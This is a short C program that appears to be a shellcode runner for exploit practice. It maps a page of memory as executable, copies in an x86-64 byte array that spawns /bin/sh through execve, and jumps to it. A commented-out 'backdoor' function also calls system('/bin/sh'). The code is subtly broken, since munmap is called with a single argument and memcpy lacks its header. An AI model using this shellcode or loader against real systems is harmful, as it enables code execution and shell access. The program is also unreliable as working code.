#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/mman.h>

/*
void backdoor()
{
    printf("Hi Backdoor\n");
    system("/bin/sh");
}
 */

char shellcode[] = {0x6a, 0x68, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x73, 0x50, 0x48, 0x89, 0xe7, 0x68, 0x72, 0x69, 0x01, 0x01, 0x81, 0x34, 0x24, 0x01, 0x01, 0x01, 0x01, 0x31, 0xf6, 0x56, 0x6a, 0x08, 0x5e, 0x48, 0x01, 0xe6, 0x56, 0x48, 0x89, 0xe6, 0x31, 0xd2, 0x6a, 0x3b, 0x58, 0x0f, 0x05};

int main(int argc, char *argv[])
{
    char* buffer = mmap(NULL, 4096, PROT_EXEC|PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (buffer == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }
    memcpy(buffer, shellcode, sizeof(shellcode));

    void (*ptr)(void) = buffer;

    ptr();

    munmap(buffer);
    return 0;
}
